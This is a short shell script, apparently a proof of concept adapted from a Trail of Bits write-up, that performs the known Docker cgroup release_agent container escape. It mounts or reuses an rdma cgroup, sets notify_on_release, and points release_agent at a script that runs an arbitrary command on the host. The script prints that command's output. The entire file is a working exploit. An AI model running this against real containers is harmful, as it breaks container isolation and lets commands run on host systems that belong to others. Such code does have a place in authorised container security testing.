#!/bin/sh

cmd=$1
exploitCGroupBreakout() {

  echo "Exploiting cGroupEscape"
  # POC modified from https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
  # shellcheck disable=SC2012 # Not using find as it may not be available
  if cat /proc/self/mountinfo | grep -q '^[^[:space:]]*[[:space:]][^[:space:]]*[[:space:]][^[:space:]]*[[:space:]][^[:space:]]*[[:space:]]/sys/fs/cgroup/rdma[[:space:]]rw[[:space:],]'; then
    # then, cgroup is mounted as read-write
    d=`dirname $(ls -x /s*/fs/c*/r*/r* |head -n1)`
    mkdir -p $d/x
  else
    # else, cgroup is not mounted as read-write, try to mount rdma controller and gain access to write to the cgroup
    d=/tmp/cgrp
    mkdir -p $d && mount -t cgroup -o rdma cgroup $d && mkdir $d/x
  fi

  echo 1 > $d/x/notify_on_release
  host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
  touch /output
  echo "$host_path/cmd_to_execute" > $d/release_agent
  echo '#!/bin/sh' > /cmd_to_execute
  echo "$cmd > $host_path/output" >> /cmd_to_execute
  chmod +x /cmd_to_execute
  sh -c "echo \$\$ > $d/x/cgroup.procs"
  sleep 1
  cat /output
  rm /cmd_to_execute /output
}

exploitCGroupBreakout
